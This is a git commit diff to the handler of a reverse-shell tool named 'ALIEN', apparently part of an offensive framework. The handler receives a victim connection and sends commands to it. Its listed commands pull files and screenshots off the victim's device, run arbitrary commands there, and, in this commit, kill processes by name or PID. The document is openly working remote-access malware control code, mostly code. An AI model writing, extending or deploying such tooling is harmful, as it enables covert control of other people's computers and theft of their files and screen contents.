09a2cdb7027d69d76325c97768423e252dfc53f5
___GoodWay___ <80381071+G00Dway@users.noreply.github.com>
2022-04-24 03:40:12 -0400

    Add files via upload

--- lib/data/handlers/alien-shell-handler.py
+++ lib/data/handlers/alien-shell-handler.py
@@ -24,8 +24,7 @@ print(Fore.YELLOW+"[+]"+Fore.RESET+f" Got Connection: {HOST}:{PORT}")
 
 while True:                                                     #start while True 
 
-    print("\033[4mtmf\033[0m-\033[4mshell\033[0m > ")     # ask the user for command 
-    Shell_User   = input()                                      # Get the command
+    Shell_User = input("\033[4mtmf\033[0m-\033[4mshell\033[0m > ")     # ask the user for command 
     L_Shell_User = Shell_User.split(" ")                        # convert command to list
 
     if Shell_User == "quit":                                    # if user said quit 
@@ -34,31 +33,37 @@ while True:                                                     #start while Tru
         quit()                                                  # end then quit
 
     elif L_Shell_User[0] == "file":                             # if user went to get file form client 
-
         if L_Shell_User[1] == "get":                                    
             Client.send(bytes(Shell_User, encoding="utf-8"))            # send request to client
             FileDate = binascii.a2b_base64(Client.recv(1073741824))     # get file date in base60 
-            with open(f"Copy_{L_Shell_User[2]}", "wb") as File:         # save the date in file 
+            with open(f"Client_{L_Shell_User[2]}", "wb") as File:         # save the date in file 
                 File.write(FileDate)                                    # write file 
 
-    elif L_Shell_User[0] == "showscreen":                               # if user went to get screnshot form client 
+    elif L_Shell_User[0] == "showScreen" or L_Shell_User == "showscreen":                               # if user went to get screnshot form client 
         Client.send(bytes(Shell_User, encoding="utf-8"))                # send request to client 
         FileDate = binascii.a2b_base64(Client.recv(1073741824))         # open file 
         with open(f"/root/.tmf/Screen.png", "wb") as File: File.write(FileDate)    # save file date as png
         print(Fore.YELLOW+'[+]'+Fore.RESET+' Image Saved At: "/root/.tmf" as Screen.png')
         Image.open("/root/.tmf/Screen.png").show()
+    
+    elif L_Shell_User[0] == 'stop':
+        if L_Shell_User[1] == "" or L_Shell_User[1] == " ":
+            print(Fore.RED+'[-]'+Fore.RESET+' Enter Process NAME\PID.')
+        else:
+            Client.send(bytes(Shell_User, encoding="utf-8"))
 
     elif L_Shell_User[0] == "help":                                     # if user entred invalid command or asked for help 
         print("""
 ALIEN Reverse Shell Commands
 ============================
 
-1 -> file get FILENAME     | get files from user
-2 -> "command"             | run command(s) on users device
-3 -> showscreen            | get screenshot from user
-4 -> chdir path\dir        | change the directory "cd"
-5 -> path                  | show current directory (path)
+1 -> file get "FILENAME"   | Get files from user
+2 -> cmd "COMMAND"         | Run command(s) on users device
+3 -> showscreen            | Get screenshot from user
+4 -> chdir "PATH\DIR"      | Change the directory "cd"
+5 -> path                  | Show current directory (path)
 6 -> back                  | Go back from existing directory (one-by)
+7 -> stop "NAME\PID"       | Stop\kill a process by name or PID   
 """)
 
     else:
